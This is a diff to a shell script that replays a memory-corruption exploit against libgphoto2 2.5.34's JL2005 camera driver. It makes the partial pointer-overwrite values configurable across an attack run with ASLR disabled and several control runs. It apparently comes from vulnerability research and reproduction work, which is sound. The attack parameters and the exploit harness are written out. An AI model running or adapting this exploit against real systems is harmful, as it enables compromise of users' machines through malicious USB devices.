@@ -16,6 +16,8 @@ S=$BASE/src/libgphoto2-2.5.34
 B=$BASE/build
 P=$B/installdir
 PROBE=$BASE/w194-file-consumer-probe
+PRIV16=${PRIV16:-0x7430}
+WRONG=${WRONG:-0x5430}
 
 [ -d "$S" ] && [ -d "$B" ] || { echo "missing W193 base; run replay-partial-priv.sh first" >&2; exit 2; }
 command -v clang >/dev/null || { echo "clang is required" >&2; exit 2; }
@@ -54,22 +56,22 @@ run() {
 echo "== attack: ASLR off, device-chosen partial priv, header repair on =="
 rm -f "$BASE/w194-attack.bin"
 run ATTACK env M2SHELL_JL2005_VUSB=r M2SHELL_JL2005_COUNT=1022 \
-	M2SHELL_JL2005_PRIV16=0x7430 M2SHELL_W194_REPAIR=1 \
+	M2SHELL_JL2005_PRIV16="$PRIV16" M2SHELL_W194_REPAIR=1 \
 	setarch -R "$PROBE" usb:001,001 "$BASE/w194-attack.bin"
 
 echo "== control: same corruption with no header repair =="
 run NO_REPAIR env M2SHELL_JL2005_VUSB=r M2SHELL_JL2005_COUNT=1022 \
-	M2SHELL_JL2005_PRIV16=0x7430 \
+	M2SHELL_JL2005_PRIV16="$PRIV16" \
 	setarch -R "$PROBE" usb:001,001 "$BASE/w194-norepair.bin"
 
 echo "== control: wrong 4-bit candidate with ASLR off, repair on =="
 run WRONG env M2SHELL_JL2005_VUSB=r M2SHELL_JL2005_COUNT=1022 \
-	M2SHELL_JL2005_PRIV16=0x5430 M2SHELL_W194_REPAIR=1 \
+	M2SHELL_JL2005_PRIV16="$WRONG" M2SHELL_W194_REPAIR=1 \
 	setarch -R "$PROBE" usb:001,001 "$BASE/w194-wrong.bin"
 
 echo "== control: safe count 100 =="
 run SAFE env M2SHELL_JL2005_VUSB=r M2SHELL_JL2005_COUNT=100 \
-	M2SHELL_JL2005_PRIV16=0x7430 M2SHELL_W194_REPAIR=1 \
+	M2SHELL_JL2005_PRIV16="$PRIV16" M2SHELL_W194_REPAIR=1 \
 	M2SHELL_W194_SKIP_CONSUMER=1 \
 	setarch -R "$PROBE" usb:001,001 "$BASE/w194-safe.bin"
 
